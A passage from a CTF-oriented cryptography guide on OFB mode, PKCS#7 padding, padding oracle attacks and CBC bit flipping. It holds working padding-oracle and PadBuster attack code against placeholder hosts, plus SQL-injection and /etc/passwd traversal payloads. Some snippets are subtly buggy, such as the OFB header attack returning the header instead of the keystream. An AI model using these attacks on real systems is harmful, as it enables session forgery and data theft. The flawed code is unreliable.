    print("CBC: Error propagation (current + next block = 32 bytes)")

demonstrate_ofb_no_error_propagation()
```

**Tools and Commands**

```bash
# OpenSSL OFB mode
openssl enc -aes-256-ofb -in plaintext.txt -out cipher.bin \
  -K $(xxd -p -c32 key.bin) -iv $(xxd -p iv.bin)

openssl enc -d -aes-256-ofb -in cipher.bin -out decrypted.txt \
  -K $(xxd -p -c32 key.bin) -iv $(xxd -p iv.bin)

# Python OFB encryption/decryption
python3 << 'EOF'
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes

key = get_random_bytes(32)  # AES-256
iv = get_random_bytes(16)
plaintext = b"Test message for OFB mode"

# Encrypt
cipher = AES.new(key, AES.MODE_OFB, iv=iv)
ciphertext = cipher.encrypt(plaintext)
print(f"Ciphertext: {ciphertext.hex()}")

# Decrypt (same operation)
cipher = AES.new(key, AES.MODE_OFB, iv=iv)
decrypted = cipher.decrypt(ciphertext)
print(f"Decrypted: {decrypted}")

# Verify encryption = decryption operation
cipher_enc = AES.new(key, AES.MODE_OFB, iv=iv)
cipher_dec = AES.new(key, AES.MODE_OFB, iv=iv)
assert cipher_enc.encrypt(plaintext) == ciphertext
assert cipher_dec.decrypt(ciphertext) == plaintext
print("OFB symmetry verified")
EOF

# CyberChef OFB operations
# Input → AES Encrypt → Mode: OFB → Key: [hex] → IV: [hex]
```

**CTF Scenarios**

```python
# ofb_ctf_patterns.py

# Pattern 1: IV reuse detection and exploitation
def detect_ofb_iv_reuse(ciphertexts):
    """
    Collect multiple ciphertexts, test for keystream reuse
    """
    from itertools import combinations
    
    for (idx1, ct1), (idx2, ct2) in combinations(enumerate(ciphertexts), 2):
        # XOR ciphertexts
        xor = bytes(a ^ b for a, b in zip(ct1, ct2))
        
        # Look for patterns indicating plaintext XOR
        # (e.g., many printable characters)
        printable = sum(1 for b in xor if 32 <= b < 127)
        ratio = printable / len(xor)
        
        if ratio > 0.5:  # Likely plaintext XOR
            print(f"Possible IV reuse between messages {idx1} and {idx2}")
            print(f"XOR result printable ratio: {ratio:.2%}")

# Pattern 2: Known plaintext keystream recovery
def ofb_known_plaintext_exploit(known_pairs, target_ciphertext):
    """
    Given multiple known plaintext-ciphertext pairs,
    recover keystream and decrypt target
    """
    # Find longest known plaintext
    longest_pair = max(known_pairs, key=lambda x: len(x[0]))
    known_pt, known_ct = longest_pair
    
    # Recover keystream
    keystream = bytes(p ^ c for p, c in zip(known_pt, known_ct))
    
    # Decrypt target (up to keystream length)
    decrypted_length = min(len(keystream), len(target_ciphertext))
    decrypted = bytes(k ^ c for k, c in 
                     zip(keystream[:decrypted_length], 
                         target_ciphertext[:decrypted_length]))
    
    print(f"Keystream recovered: {len(keystream)} bytes")
    print(f"Decrypted: {decrypted}")
    
    if len(target_ciphertext) > len(keystream):
        print(f"[Inference: Remaining {len(target_ciphertext) - len(keystream)} bytes unknown]")

# Pattern 3: Bit flipping for authentication bypass
def ofb_authentication_bypass(ciphertext, token_position, token_format):
    """
    Common scenario: Session token in encrypted data
    Flip bits to forge valid token
    """
    # Example: Change timestamp or user_id in token
    # token_format: {"user_id": 123, "expires": 1234567890}
    
    # If we know structure, can flip bits to modify values
    modified = bytearray(ciphertext)
    
    # Example: Change user_id from 123 (0x7B) to 1 (0x01)
    # modified[token_position] ^= 0x7B ^ 0x01
    
    print(f"Original token position: {token_position}")
    print("[Inference: Modify ciphertext bytes to flip plaintext bits]")
    
    return bytes(modified)

# Pattern 4: File format exploitation
def ofb_file_header_attack(encrypted_file, file_format="PNG"):
    """
    If file format known, recover keystream from header
    """
    headers = {
        "PNG": b"\x89PNG\r\n\x1a\n",
        "JPEG": b"\xff\xd8\xff",
        "PDF": b"%PDF-",
        "GIF": b"GIF89a",
        "ZIP": b"PK\x03\x04"
    }
    
    known_header = headers.get(file_format)
    if not known_header:
        print(f"Unknown file format: {file_format}")
        return None
    
    # Recover keystream from header
    keystream = bytes(h ^ e for h, e in 
                     zip(known_header, encrypted_file[:len(known_header)]))
    
    print(f"Recovered keystream (first {len(keystream)} bytes): {keystream.hex()}")
    
    # Decrypt rest of file (up to keystream length)
    decrypted = bytes(k ^ e for k, e in 
                     zip(keystream, encrypted_file[:len(keystream)]))
    
    return decrypted

# Pattern 5: Stream cipher reuse across files
def ofb_multi_file_attack(encrypted_files, known_file_type):
    """
    If multiple files encrypted with same IV:
    - Recover keystream from one with known header
    - Decrypt all others
    """
    print(f"Analyzing {len(encrypted_files)} files...")
    
    # Assume first file has known header
    keystream = ofb_file_header_attack(encrypted_files[0], known_file_type)
    
    if keystream:
        for idx, enc_file in enumerate(encrypted_files[1:], 1):
            decrypted = bytes(k ^ e for k, e in 
                            zip(keystream, enc_file[:len(keystream)]))
            print(f"File {idx} decrypted (partial): {decrypted[:50]}")
```

**Comparison with CTR Mode**

```python
# ofb_vs_ctr.py
def compare_ofb_ctr():
    """
    OFB vs CTR similarities and differences
    
    Similarities:
    - Both are stream ciphers (XOR keystream with plaintext)
    - Both have no padding
    - Encryption = Decryption operation
    - Both vulnerable to IV/nonce reuse
    - Both support random access decryption
    
    Differences:
    OFB:
    - Keystream depends on previous output (feedback)
    - Sequential keystream generation (cannot parallelize)
    - Keystream independent of plaintext/ciphertext
    - Potential for keystream cycles (theoretical)
    
    CTR:
    - Keystream depends on counter value
    - Parallelizable (each block independent)
    - Can precompute keystream
    - No cycle concerns (counter never repeats with unique nonce)
    """
    
    print("OFB: O[i] = E(K, O[i-1]), C[i] = P[i] ⊕ O[i]")
    print("CTR: C[i] = P[i] ⊕ E(K, Nonce || Counter[i])")
    print("\n[Inference: CTR preferred for performance due to parallelization]")

compare_ofb_ctr()
```

**Weaknesses Summary**

- IV reuse catastrophic: identical to one-time pad reuse
- Malleable: bit flipping attacks without detection
- Known plaintext reveals keystream for reuse scenarios
- Sequential operation (not parallelizable, slower than CTR)
- No authentication (vulnerable to modification)
- Less commonly used in modern protocols (CTR preferred)
- [Unverified: Theoretical keystream cycles for weak ciphers or small block sizes]

---

### Mode Selection Guidelines for CTF Analysis

```python
# mode_identification.py
def identify_encryption_mode(oracle_func):
    """
    Heuristics to identify block cipher mode from encryption oracle
    """
    
    # Test 1: Block alignment (padding detection)
    test1 = oracle_func(b"A" * 15)
    test2 = oracle_func(b"A" * 16)
    test3 = oracle_func(b"A" * 17)
    
    if len(test1) == 15:
        print("Likely stream cipher mode: CTR, CFB-8, OFB")
    elif len(test1) == 16:
        print("Block cipher with padding: ECB, CBC, possibly CFB-128")
    
    # Test 2: Determinism (ECB detection)
    repeat1 = oracle_func(b"A" * 32)
    repeat2 = oracle_func(b"A" * 32)
    
    if repeat1 == repeat2:
        print("Deterministic: Likely ECB (or reused IV in other modes)")
        
        # Confirm ECB: identical blocks
        if repeat1[:16] == repeat1[16:32]:
            print("CONFIRMED: ECB mode (duplicate blocks)")
    else:
        print("Randomized: CBC, CTR, CFB, OFB, or GCM with random IV/nonce")
    
    # Test 3: Error propagation
    original = oracle_func(b"B" * 48)
    corrupted = bytearray(original)
    corrupted[16] ^= 0x01  # Flip bit in second block
    
    # [Note: Requires decryption oracle for error propagation test]
    print("\nError propagation test requires decryption oracle")
    print("ECB: 1 block affected")
    print("CBC: Current + next block affected")
    print("CFB: Current + next block affected")
    print("CTR/OFB: Only corrupted byte affected")

# Example usage
def mock_oracle(plaintext):
    from Crypto.Cipher import AES
    from Crypto.Random import get_random_bytes
    key = get_random_bytes(16)
    cipher = AES.new(key, AES.MODE_ECB)
    from Crypto.Util.Padding import pad
    return cipher.encrypt(pad(plaintext, 16))

print("Analyzing encryption oracle...")
identify_encryption_mode(mock_oracle)
```

### Important Related Topics

For comprehensive block cipher mode exploitation, also study:

- **Padding Oracle Attacks** (detailed CBC exploitation techniques)
- **AES-GCM Forbidden Attack** (polynomial-based authentication key recovery)
- **Initialization Vector Prediction** (sequential IV vulnerabilities)
- **Block Cipher Cryptanalysis** (differential, linear cryptanalysis)
- **Side-Channel Attacks** (timing, power analysis on mode implementations)
- **Authenticated Encryption** (CCM, EAX, SIV modes)

---

## Padding & Error Handling

### PKCS#7 Padding

#### Padding Fundamentals

**Purpose and Mechanism**

```
PKCS#7 padding ensures plaintext fits block cipher requirements (typically 8 or 16-byte blocks).

Rule: Add N bytes of value N to reach block boundary
- If plaintext = 5 bytes, block = 8 bytes → add 3 bytes of 0x03
- If plaintext already fits exactly → add full block of padding

Example (8-byte blocks):
Plaintext: "HELLO" (5 bytes)
Padded:    "HELLO\x03\x03\x03" (8 bytes)

Plaintext: "TESTDATA" (8 bytes, exact fit)
Padded:    "TESTDATA\x08\x08\x08\x08\x08\x08\x08\x08" (16 bytes)
```

**Valid Padding Values**

```
Block size 16 (AES):
Valid padding bytes: 0x01 through 0x10

Examples:
...data\x01                                    (1 byte padding)
...data\x02\x02                                (2 bytes padding)
...data\x0F\x0F\x0F\x0F\x0F\x0F\x0F\x0F\x0F\x0F\x0F\x0F\x0F\x0F\x0F (15 bytes)
\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10 (full block)
```

#### Padding Validation

**Correct Validation Algorithm**

```python
def is_valid_pkcs7_padding(data, block_size=16):
    """
    Validates PKCS#7 padding
    """
    if len(data) == 0 or len(data) % block_size != 0:
        return False
    
    # Get padding value from last byte
    padding_value = data[-1]
    
    # Padding value must be 1 to block_size
    if padding_value < 1 or padding_value > block_size:
        return False
    
    # All padding bytes must equal padding_value
    padding_bytes = data[-padding_value:]
    return all(byte == padding_value for byte in padding_bytes)

# Example usage
valid = b"HELLO\x03\x03\x03"
is_valid_pkcs7_padding(valid, 8)  # Returns: True

invalid = b"HELLO\x03\x02\x01"
is_valid_pkcs7_padding(invalid, 8)  # Returns: False
```

**Common Implementation Errors**

```python
# INCORRECT: Only checks last byte
def bad_validation_1(data):
    padding = data[-1]
    return 1 <= padding <= 16  # Missing: Check all padding bytes match

# INCORRECT: Doesn't verify all padding bytes
def bad_validation_2(data):
    padding = data[-1]
    return len(data[-padding:]) == padding  # Missing: Check byte values

# INCORRECT: Vulnerable to timing attacks
def bad_validation_3(data):
    padding = data[-1]
    for i in range(padding):
        if data[-(i+1)] != padding:
            return False  # Early return reveals position of invalid byte
    return True
```

#### Manual Padding Operations

**Adding PKCS#7 Padding**

```python
def pkcs7_pad(data, block_size=16):
    """Add PKCS#7 padding to data"""
    padding_length = block_size - (len(data) % block_size)
    padding = bytes([padding_length] * padding_length)
    return data + padding

# Examples
pkcs7_pad(b"HELLO", 8)
# Returns: b'HELLO\x03\x03\x03'

pkcs7_pad(b"TESTDATA", 8)
# Returns: b'TESTDATA\x08\x08\x08\x08\x08\x08\x08\x08'
```

**Removing PKCS#7 Padding**

```python
def pkcs7_unpad(data, block_size=16):
    """Remove PKCS#7 padding from data"""
    if not is_valid_pkcs7_padding(data, block_size):
        raise ValueError("Invalid PKCS#7 padding")
    
    padding_length = data[-1]
    return data[:-padding_length]

# Example
padded = b"HELLO\x03\x03\x03"
pkcs7_unpad(padded, 8)
# Returns: b'HELLO'
```

#### CyberChef Padding Operations

```
Operations → Encryption/Encoding → AES Decrypt

Padding options:
- PKCS#7 (default for most modes)
- ISO/IEC 9797-1 (bit padding: 0x80 followed by 0x00)
- ANSI X.923 (0x00 bytes, last byte = padding length)
- ISO 10126 (random bytes, last byte = padding length)
- Zero padding (0x00 bytes, ambiguous for data ending in nulls)

Example AES-CBC decryption:
Input: [ciphertext hex]
Key: [32 hex chars for AES-128]
IV: [32 hex chars]
Mode: CBC
Padding: PKCS#7
```

#### CTF Challenge Identification

**Recognizing Padding Issues**

```bash
# Symptoms of padding problems:
1. Decryption returns partial plaintext with garbage at end
2. "Padding is invalid and cannot be removed" error
3. Extra bytes that don't match expected plaintext format
4. Decrypted data length not multiple of block size

# Testing with OpenSSL
echo "Hello" | openssl enc -aes-128-cbc -K 00112233445566778899aabbccddeeff -iv 00000000000000000000000000000000 | xxd

# Decrypt and observe padding
openssl enc -aes-128-cbc -d -K 00112233445566778899aabbccddeeff -iv 00000000000000000000000000000000 -in encrypted.bin -nopad | xxd
```

---

### Padding Oracle Attacks

#### Attack Concept

**Oracle Definition** [Inference] A padding oracle is any system component that reveals whether ciphertext decrypts to validly padded plaintext through:

- Error messages ("Invalid padding" vs "Decryption failed")
- Timing differences (valid padding processes faster/slower)
- HTTP status codes (200 OK vs 500 Internal Error)
- Behavioral differences (redirect vs error page)

**Attack Capability**

```
With a padding oracle, an attacker can:
1. Decrypt arbitrary ciphertext WITHOUT knowing the key
2. Encrypt arbitrary plaintext WITHOUT knowing the key
3. Works against CBC mode encryption
4. Requires ability to submit modified ciphertext repeatedly
```

**Mathematical Foundation**

```
CBC Decryption: P_i = D_K(C_i) ⊕ C_{i-1}
Where:
- P_i = plaintext block i
- C_i = ciphertext block i
- D_K = block cipher decryption with key K
- ⊕ = XOR operation

Key insight: By manipulating C_{i-1}, we can control P_i and observe padding validation
```

#### Attack Methodology

**Step-by-Step Process (Decrypting One Block)**

```
Goal: Decrypt ciphertext block C_2 using blocks C_1 (IV) and C_2

Step 1: Isolate two blocks
Original: IV | C_1 | C_2 | C_3
Test:     IV | C_2 (treat C_2 as new ciphertext, modify IV)

Step 2: Brute force last byte of intermediate value I_2
For each guess g (0x00 to 0xFF):
  Modified_IV[-1] = g ⊕ 0x01  # Target padding 0x01
  Submit: Modified_IV | C_2
  If oracle returns "valid padding":
    I_2[-1] = g  # Found intermediate value
    P_2[-1] = I_2[-1] ⊕ C_1[-1]  # Recover plaintext byte

Step 3: Brute force second-to-last byte
Set Modified_IV[-1] = I_2[-1] ⊕ 0x02  # Make last byte 0x02
For each guess g (0x00 to 0xFF):
  Modified_IV[-2] = g ⊕ 0x02  # Target padding 0x02 0x02
  Submit: Modified_IV | C_2
  If oracle returns "valid padding":
    I_2[-2] = g
    P_2[-2] = I_2[-2] ⊕ C_1[-2]

Step 4: Repeat for all 16 bytes (AES) or 8 bytes (DES/3DES)

Step 5: Repeat for all blocks in ciphertext
```

**Visual Example (8-byte block)**

```
Target ciphertext: C_1 | C_2
Known: C_1 = 0xAA BB CC DD EE FF 00 11

Attacking last byte of C_2:
IV = 0x00 00 00 00 00 00 00 [guess ⊕ 0x01]

Test guess = 0x42:
IV = 0x00 00 00 00 00 00 00 0x43
Submit: IV | C_2 → "Invalid padding"

Test guess = 0x89:
IV = 0x00 00 00 00 00 00 00 0x88
Submit: IV | C_2 → "Valid padding" ✓

Found: I_2[-1] = 0x89
Plaintext: P_2[-1] = 0x89 ⊕ 0x11 = 0x98

Next byte (second-to-last):
IV = 0x00 00 00 00 00 00 [guess ⊕ 0x02] 0x8B
(Note: last byte = 0x89 ⊕ 0x02 = 0x8B to make it 0x02)
```

#### Practical Implementation

**Using PadBuster**

```bash
# Installation
git clone https://github.com/AonCyberLabs/PadBuster.git
cd PadBuster
perl padBuster.pl

# Basic attack syntax
./padBuster.pl [URL] [ENCRYPTED_SAMPLE] [BLOCK_SIZE] [OPTIONS]

# Example: Decrypt cookie
./padBuster.pl http://target.com/page.php \
  "U7bRKauGMMS3S9IqP1YtBmfE4FJpZ5WC" \
  8 \
  -cookies "auth=U7bRKauGMMS3S9IqP1YtBmfE4FJpZ5WC" \
  -encoding 0

# Encoding options:
# 0 = Base64
# 1 = Hex lowercase
# 2 = Hex uppercase
# 3 = .NET UrlToken

# Example: Encrypt new plaintext
./padBuster.pl http://target.com/page.php \
  "U7bRKauGMMS3S9IqP1YtBmfE4FJpZ5WC" \
  8 \
  -cookies "auth=U7bRKauGMMS3S9IqP1YtBmfE4FJpZ5WC" \
  -encoding 0 \
  -plaintext "admin=true"

# Advanced options
-error "Invalid padding"     # Custom error message to detect
-noiv                         # Ciphertext has no IV (uses null IV)
-log                          # Save detailed log
-proxy http://127.0.0.1:8080  # Route through Burp/proxy
```

**Manual Python Implementation**

```python
import requests
from base64 import b64encode, b64decode

def padding_oracle(ciphertext):
    """
    Oracle function - returns True if padding valid
    Adapt this to your specific target
    """
    response = requests.get(
        'http://target.com/decrypt',
        cookies={'auth': b64encode(ciphertext).decode()}
    )
    
    # Detect valid padding based on response
    # Method 1: Error message
    if "Invalid padding" in response.text:
        return False
    
    # Method 2: Status code
    # if response.status_code == 500:
    #     return False
    
    # Method 3: Response time (timing attack)
    # if response.elapsed.total_seconds() < 0.1:
    #     return False
    
    return True

def decrypt_block(ciphertext_block, previous_block, block_size=16):
    """
    Decrypt single ciphertext block using padding oracle
    """
    intermediate = bytearray(block_size)
    plaintext = bytearray(block_size)
    
    # Work backwards through block
    for pad_value in range(1, block_size + 1):
        # Adjust known bytes to create valid padding
        padding_iv = bytearray(block_size)
        for i in range(block_size - pad_value + 1, block_size):
            padding_iv[i] = intermediate[i] ^ pad_value
        
        # Brute force current byte
        found = False
        for guess in range(256):
            padding_iv[block_size - pad_value] = guess
            
            test_ciphertext = bytes(padding_iv) + ciphertext_block
            
            if padding_oracle(test_ciphertext):
                # Verify not false positive (for pad_value=1)
                if pad_value == 1:
                    # Try modifying second-to-last byte
                    verify_iv = bytearray(padding_iv)
                    verify_iv[-2] ^= 0xFF
                    if not padding_oracle(bytes(verify_iv) + ciphertext_block):
                        continue  # False positive
                
                # Found valid intermediate byte
                intermediate[block_size - pad_value] = guess ^ pad_value
                plaintext[block_size - pad_value] = (
                    intermediate[block_size - pad_value] ^ 
                    previous_block[block_size - pad_value]
                )
                found = True
                break
        
        if not found:
            raise Exception(f"Could not find byte at position {pad_value}")
    
    return bytes(plaintext)

# Usage example
ciphertext = b64decode("U7bRKauGMMS3S9IqP1YtBmfE4FJpZ5WC")
block_size = 16

# Split into blocks
blocks = [ciphertext[i:i+block_size] for i in range(0, len(ciphertext), block_size)]

# Decrypt each block
plaintext = b""
for i in range(1, len(blocks)):
    decrypted = decrypt_block(blocks[i], blocks[i-1], block_size)
    plaintext += decrypted

print("Decrypted:", plaintext)
```

#### Detection and Exploitation

**Identifying Padding Oracles in CTF**

```bash
# Test 1: Modify last byte of ciphertext
original="U7bRKauGMMS3S9IqP1YtBw=="
modified="U7bRKauGMMS3S9IqP1YtBg=="  # Changed last char

curl -b "auth=$original" http://target.com/
# Response: 200 OK

curl -b "auth=$modified" http://target.com/
# Response: 500 Internal Server Error - "Padding incorrect"
# ^ VULNERABLE TO PADDING ORACLE

# Test 2: Timing-based oracle
time curl -b "auth=$original" http://target.com/  # 0.245s
time curl -b "auth=$modified" http://target.com/  # 0.089s
# ^ Different response times indicate oracle
```

**Common Oracle Locations**

```
1. Authentication cookies (session tokens)
   - Cookie: auth=[encrypted_data]
   
2. URL parameters
   - GET /view?data=[encrypted_parameter]
   
3. Hidden form fields
   - <input type="hidden" name="state" value="[encrypted]">
   
4. JWT encrypted payloads (JWE)
   
5. SAML tokens
   
6. Viewstate in ASP.NET applications
   - __VIEWSTATE=[encrypted_viewstate]
```

**Burp Suite Integration**

```
1. Install BApp: "Padding Oracle Attack" or "PadBuster"
2. Right-click on request → Extensions → Padding Oracle Attack
3. Configure:
   - Parameter to attack
   - Block size (8 or 16)
   - Error pattern to detect
4. Start attack
5. Review decrypted plaintext in results
```

#### Mitigation Detection

**Identifying Protected Systems**

```python
# Test for constant-time comparison
import time

def test_timing_difference(oracle_func):
    """Check if system has timing-based oracle"""
    times_valid = []
    times_invalid = []
    
    for _ in range(100):
        start = time.time()
        oracle_func(valid_ciphertext)
        times_valid.append(time.time() - start)
        
        start = time.time()
        oracle_func(invalid_ciphertext)
        times_invalid.append(time.time() - start)
    
    avg_valid = sum(times_valid) / len(times_valid)
    avg_invalid = sum(times_invalid) / len(times_invalid)
    
    difference = abs(avg_valid - avg_invalid)
    
    if difference > 0.01:  # 10ms threshold
        print(f"Timing oracle detected: {difference:.4f}s difference")
        return True
    return False
```

**Authenticated Encryption Check**

```
Protected system characteristics:
1. Same error message for all decryption failures
2. No timing differences between padding/MAC errors
3. Uses AES-GCM, ChaCha20-Poly1305, or AES-CCM
4. Validates authentication tag BEFORE padding
5. Generic error: "Decryption failed" (not "Invalid padding")
```

---

### CBC Bit Flipping

#### Attack Theory

**CBC Encryption Process**

```
CBC Encryption:
C_i = E_K(P_i ⊕ C_{i-1})
Where C_0 = IV

CBC Decryption:
P_i = D_K(C_i) ⊕ C_{i-1}

Key vulnerability: Modifying C_{i-1} directly XORs with P_i
```

**Attack Capability**

```
Given:
- Control over ciphertext (can modify C_{i-1})
- Knowledge of plaintext structure in block P_i
- No control over encryption key

Can achieve:
- Modify specific bytes in P_i predictably
- Bypass authentication checks
- Escalate privileges
- Inject malicious data

Limitation: Corrupts P_{i-1} when modifying C_{i-1}
```

#### Practical Exploitation

**Basic Bit Flipping Formula**

```
To change byte at position j in plaintext block P_i:

1. Original: P_i[j] = D_K(C_i) ⊕ C_{i-1}[j]
2. Modify:   C'_{i-1}[j] = C_{i-1}[j] ⊕ P_i[j] ⊕ P'_i[j]
3. Result:   P'_i[j] = D_K(C_i) ⊕ C'_{i-1}[j]
                      = D_K(C_i) ⊕ C_{i-1}[j] ⊕ P_i[j] ⊕ P'_i[j]
                      = P_i[j] ⊕ P_i[j] ⊕ P'_i[j]
                      = P'_i[j]

Simplified: C'_{i-1}[j] = C_{i-1}[j] ⊕ (P_i[j] ⊕ P'_i[j])
```

**Example: Privilege Escalation**

```python
from base64 import b64decode, b64encode

# Scenario: Cookie contains "user=guest;admin=false"
# Goal: Change to "user=guest;admin=true_"

cookie_b64 = "vNp6xThiJKm3KCPmCxEEBmrCc4cKztNlrQSHkj4dIwI="
ciphertext = bytearray(b64decode(cookie_b64))

# Known plaintext structure (block aligned):
# Block 0 (IV): [controlled by server]
# Block 1: "user=guest;admin="  (16 bytes)
# Block 2: "false\x0B\x0B\x0B..."  (16 bytes with padding)

# Target: Change "false" to "true_" in block 2
# Need to modify block 1 (C_1) to affect plaintext block 2 (P_2)

block_size = 16
target_block = 1  # Modify C_1 to affect P_2

# Calculate XOR difference
original_bytes = b"false"
target_bytes = b"true_"

for i, (orig, target) in enumerate(zip(original_bytes, target_bytes)):
    position = target_block * block_size + i
    # XOR: C_1[i] = C_1[i] ⊕ original ⊕ target
    ciphertext[position] ^= orig ^ target

# Encode and use modified cookie
modified_cookie = b64encode(bytes(ciphertext)).decode()
print("Modified cookie:", modified_cookie)

# Result: Block 1 (P_1) is corrupted (garbage data)
#         Block 2 (P_2) now contains "true_\x0B\x0B\x0B..."
```

**Visual Walkthrough**

```
Original ciphertext blocks:
IV  | C_1                           | C_2
    | [16 bytes]                    | [16 bytes]

Decryption produces:
P_1 = D(C_1) ⊕ IV                   P_2 = D(C_2) ⊕ C_1
    = "user=guest;admin="               = "false\x0B\x0B\x0B..."

Bit flip attack:
Modify C_1[0] = C_1[0] ⊕ 'f' ⊕ 't'  (change 'f' to 't')
Modify C_1[1] = C_1[1] ⊕ 'a' ⊕ 'r'  (change 'a' to 'r')
Modify C_1[2] = C_1[2] ⊕ 'l' ⊕ 'u'  (change 'l' to 'u')
Modify C_1[3] = C_1[3] ⊕ 's' ⊕ 'e'  (change 's' to 'e')
Modify C_1[4] = C_1[4] ⊕ 'e' ⊕ '_'  (change 'e' to '_')

Result after decryption:
P_1 = D(C_1) ⊕ IV                   P_2 = D(C_2) ⊕ C_1'
    = [GARBAGE - corrupted]             = "true_\x0B\x0B\x0B..."
```

#### Attack Scenarios

**Scenario 1: Bypassing Authentication**

```python
# Application encrypts: {"user":"guest","role":"user"}
# Target: {"user":"guest","role":"admin"}

def flip_to_admin(ciphertext):
    """
    Assuming block structure:
    Block 1: {"user":"guest",
    Block 2: "role":"user"}
    """
    ct = bytearray(ciphertext)
    block_size = 16
    
    # Position of "user" in second block (after "role":")
    # "role":"user"
    #        ^^^^
    # Positions 7-10 in block 2 = positions 23-26 in ciphertext
    
    # Modify previous block (C_1) at corresponding positions
    target_start = 16 + 7  # Block 2 starts at 16, target at +7
    
    # XOR difference
    original = b"user"
    target = b"admi"
    
    for i in range(4):
        ct[target_start - 16 + i] ^= original[i] ^ target[i]
    
    return bytes(ct)

# Usage
original_token = get_encrypted_token()
modified_token = flip_to_admin(original_token)
send_request_with_token(modified_token)
```

**Scenario 2: Injecting SQL Commands**

```python
# Application encrypts user input for SQL query
# Encrypted: "SELECT * FROM users WHERE id='[USER_INPUT]'"
# Goal: Inject "1' OR '1'='1"

def inject_sql(ciphertext, injection_point):
    """
    injection_point: byte position where user input starts in plaintext
    """
    ct = bytearray(ciphertext)
    block_size = 16
    
    # Original user input: "123"
    # Target injection: "1' OR '1'='1"
    
    original = b"123"
    malicious = b"1' OR '1'='1"
    
    # Calculate which block to modify
    target_block_idx = injection_point // block_size
    position_in_block = injection_point % block_size
    
    # Modify previous block
    for i, (orig, mal) in enumerate(zip(original, malicious)):
        byte_pos = target_block_idx * block_size + position_in_block + i
        # Modify previous block
        ct[byte_pos - block_size] ^= orig ^ mal
    
    return bytes(ct)
```

**Scenario 3: Manipulating File Paths**

```python
# Encrypted path: "/var/www/public/user123.txt"
# Goal: "../../../etc/passwd"

def path_traversal(ciphertext):
    ct = bytearray(ciphertext)
    
    # Known structure:
    # "/var/www/public/user123.txt"
    # Target in same position:
    # "/var/www/public/../../../etc/passwd"
    
    original_segment = b"user123.txt"
    traversal = b"../../../etc/passwd"[:len(original_segment)]
    
    # Find position (assuming known alignment)
    start_pos = 16  # Example: starts at block 2
    
    for i in range(len(original_segment)):
        ct[start_pos - 16 + i] ^= original_segment[i] ^ traversal[i]
    
    return bytes(ct)
```

#### Detection in CTF Challenges

**Identifying Bit Flipping Opportunities**

```python
def analyze_for_bitflip(encrypted_data, block_size=16):
    """
    Identify potential bit flipping targets
    """
    print(f"Ciphertext length: {len(encrypted_data)} bytes")
    print(f"Number of blocks: {len(encrypted_data) // block_size}")
    
    # Test if modifying ciphertext affects decryption
    test_ct = bytearray(encrypted_data)
    test_ct[0] ^= 0xFF  # Flip all bits in first byte
    
    try:
        response = decrypt_and_process(test_ct)
        print("Modification accepted - potential bit flip target")
        
        # Check if there's structure preservation
        if b"user=" in response or b"admin=" in response:
            print("Structured data detected - good target")
            return True
    except Exception as e:
        print(f"Modification rejected: {e}")
        return False
```

**Brute Force Bit Position**

```python
def find_target_byte(ciphertext, target_change, block_size=16):
    """
    Brute force to find which byte modification achieves target
    """
    for block_idx in range(len(ciphertext) // block_size - 1):
        for byte_idx in range(block_size):
            for xor_val in range(1, 256):
                test_ct = bytearray(ciphertext)
                pos = block_idx * block_size + byte_idx
                test_ct[pos] ^= xor_val
                
                result = decrypt_and_check(test_ct)
                if target_change in result:
                    print(f"Found: Block {block_idx}, Byte {byte_idx}, XOR {xor_val:02x}")
                    return (block_idx, byte_idx, xor_val)
    
    return None
```

#### CyberChef Workflow

```
Recipe for manual bit flipping:

1. From Base64 (if cookie/token is base64-encoded)
2. To Hex
3. Find/Replace (manual hex editing)
   - Calculate XOR: original_byte ⊕ target_byte
   - Apply to previous block at same position
4. From Hex
5. To Base64

Example:
Input: "dGVzdAAAAAAAAAA=" (base64)
↓
Hex: "74657374000000000000000000000000"
↓
Modify byte 4 in first block: 0x00 → (0x00 ⊕ 0x41 ⊕ 0x42)
↓
Back to base64
```

#### Automated Tools

**Using CBC Bit Flipper Script**

```bash
#!/bin/bash
# cbc_flipper.sh

COOKIE=$1
TARGET_ORIG=$2
TARGET_NEW=$3
BLOCK_SIZE=16

# Decode cookie
echo $COOKIE | base64 -d > ciphertext.bin

# Calculate XOR difference
python3 << EOF
orig = b"$TARGET_ORIG"
new = b"$TARGET_NEW"
xor_diff = bytes([o ^ n for o, n in zip(orig, new)])
print(xor_diff.hex())
EOF

# Apply flip (manual hex editing based on output)
```

**Burp Suite Intruder Payload**

```
1. Send request to Intruder
2. Mark cookie/parameter position
3. Payload type: Custom iterator
4. Position 1: Original ciphertext
5. Position 2: XOR values (0x00-0xFF)
6. Payload processing:
   - Decode base64
   - XOR at target position
   - Encode base64
7. Analyze responses for successful modifications
```

---

### Authentication Tag Validation

#### Authenticated Encryption Modes

**AEAD (Authenticated Encryption with Associated Data)**

```
Common AEAD modes:
1. AES-GCM (Galois/Counter Mode)
   - Provides confidentiality + integrity
   - Authentication tag: 128 bits (16 bytes)
   - Widely used in TLS 1.3, IPsec

2. ChaCha20-Poly1305
   - Stream cipher + MAC
   - Authentication tag: 128 bits
   - Used in TLS, WireGuard

3. AES-CCM (Counter with CBC-MAC)
   - Authentication tag: 32-128 bits (configurable)
   - Used in WPA2, Bluetooth

4. AES-OCB (Offset Codebook Mode)
   - Single-pass authenticated encryption
   - Patent restrictions (expired 2021)
```

**Structure of AEAD Ciphertext**

```
Format: [IV/Nonce] [Ciphertext] [Authentication Tag] [Optional AAD]

Example AES-GCM:
┌─────────────┬──────────────────────┬──────────────────┐
│ Nonce (12B) │ Ciphertext (variable)│ Auth Tag (16B)   │
└─────────────┴──────────────────────┴──────────────────┘
```

Associated Authenticated Data (AAD):

- Not encrypted, but authenticated
- Example: HTTP headers, packet metadata
- Tampering with AAD causes tag validation failure

````

#### AES-GCM Specifics

**Encryption Process**

```python
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes

def aes_gcm_encrypt(plaintext, key, aad=b""):
    """
    AES-GCM encryption with authentication
    """
    nonce = get_random_bytes(12)  # 96-bit nonce (recommended)
    cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
    
    # Add associated data (authenticated but not encrypted)
    if aad:
        cipher.update(aad)
    
    ciphertext, tag = cipher.encrypt_and_digest(plaintext)
    
    # Return: nonce + ciphertext + tag
    return nonce + ciphertext + tag

# Example usage
key = get_random_bytes(32)  # AES-256
plaintext = b"secret message"
aad = b"header:value"  # Optional metadata

encrypted = aes_gcm_encrypt(plaintext, key, aad)
print(f"Encrypted length: {len(encrypted)} bytes")
